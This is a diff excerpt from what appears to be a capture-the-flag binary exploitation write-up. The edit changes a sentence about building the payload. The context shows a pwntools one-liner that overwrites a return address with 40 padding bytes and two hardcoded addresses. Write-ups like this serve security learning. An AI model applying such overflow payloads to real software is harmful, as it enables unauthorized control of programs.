@@ -59,7 +59,7 @@ now again using cyclic to find the offset.
 ![](photos/cylic-pattern.png)
 
 ## Exploit writing
-we can just use echo to exploit this challenge as the payload is quite small.
+we can just craft the payload using python to exploit this challenge as the payload is quite small.
 
 ```sh
 $ python3 -c 'from pwn import *; print("A"*40 + "\x3e\x05\x40\x00\x00\x00\x00\x00" + "\x56\x07\x40\x00\x00\x00\x00\x00")
